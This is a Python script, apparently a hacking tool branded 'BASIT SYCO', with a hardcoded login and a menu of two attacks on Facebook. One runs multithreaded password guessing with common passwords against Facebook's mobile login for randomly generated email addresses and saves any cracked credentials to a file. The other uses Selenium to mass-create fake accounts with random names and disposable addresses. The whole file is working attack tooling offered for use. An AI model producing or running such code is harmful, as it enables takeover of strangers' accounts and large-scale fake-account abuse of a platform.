import os, sys, time, random, string, re
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    os.system('pip install requests selenium webdriver-manager')
    os.execl(sys.executable, sys.executable, *sys.argv)

# --- LOGIN (basitsultan / basitprince) ---
def login():
    os.system('clear')
    print("\033[1;92m====================================")
    print("\033[1;93m      BASIT SYCO GLOBAL UNLIMITED")
    print("\033[1;92m====================================")
    u = input("[+] Username: ")
    p = input("[+] Password: ")
    if u == "basitsultan" and p == "basitprince":
        menu()
    else:
        login()

# --- RANDOM GENERATOR (No Specific Names) ---
def get_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# --- UNLIMITED CLONING (GLOBAL) ---
def unlimited_cloning():
    os.system('clear')
    print("\033[1;32m--- UNLIMITED GLOBAL CLONING ---")
    limit = int(input("[+] How many random targets to attack?: "))
    
    targets = []
    domains = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@yandex.com", "@icloud.com"]
    
    for _ in range(limit):
        # Yeh har baar aik ajeeb aur naya random email banaye ga jo real IDs ko hit karega
        user_rand = get_random_string(random.randint(5, 10))
        targets.append(user_rand + random.choice(domains))

    print(f"\n\033[1;94m[*] Attacking {limit} Random Global Accounts...\n")
    
    with ThreadPool(max_workers=60) as pool:
        for mail in targets:
            # Global Common Passwords
            p_list = ["123456", "1234567", "12345678", "password", "i love you", "786786", "pakistan", "11223344"]
            pool.submit(crack_engine, mail, p_list)
    input("\n\033[1;92mProcess Done. Press Enter...")

def crack_engine(user, p_list):
    for pas in p_list:
        try:
            session = requests.Session()
            head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0'}
            res = session.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pas}, headers=head)
            if "c_user" in session.cookies.get_dict():
                print(f"\r\033[1;92m[SUCCESS] {user} | {pas}")
                open('ok.txt', 'a').write(user+'|'+pas+'\n')
                return
        except: pass
    print(f"\r\033[1;31m[FAILED]  {user}", end="")

# --- UNLIMITED CREATION (PC ONLY) ---
def unlimited_creation():
    os.system('clear')
    print("\033[1;92m--- UNLIMITED REAL ID CREATION ---")
    total = int(input("[+] How many IDs to create?: "))
    f_pass = input("[+] Fixed Password: ")
    
    options = webdriver.ChromeOptions()
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    for i in range(total):
        # Random Global Names
        first = get_random_string(6).capitalize()
        last = get_random_string(5).capitalize()
        mail = get_random_string(8) + "@mail7.io"
        
        try:
            driver.get("https://m.facebook.com/reg/")
            time.sleep(3)
            driver.find_element(By.NAME, "firstname").send_keys(first)
            driver.find_element(By.NAME, "lastname").send_keys(last)
            driver.find_element(By.NAME, "reg_email__").send_keys(mail)
            driver.find_element(By.NAME, "reg_passwd__").send_keys(f_pass)
            
            print(f"\033[1;92m[{i+1}] CREATED: {first} {last} | {mail}")
            open('created_ids.txt', 'a').write(f"{mail}|{f_pass}\n")
            time.sleep(10)
        except:
            print(f"\033[1;31m[{i+1}] BLOCKED")
    driver.quit()

def menu():
    os.system('clear')
    print("\033[1;32m  BASIT SYCO - GLOBAL UNLIMITED")
    print("\033[1;37m[1] Unlimited Global Cloning (Any Mail/Any Name)")
    print("[2] Unlimited Real Creation (PC Only)")
    print("[0] Exit")
    ch = input("\nSelect: ")
    if ch == '1': unlimited_cloning()
    elif ch == '2': unlimited_creation()
    else: sys.exit()

if __name__ == "__main__":
    login()
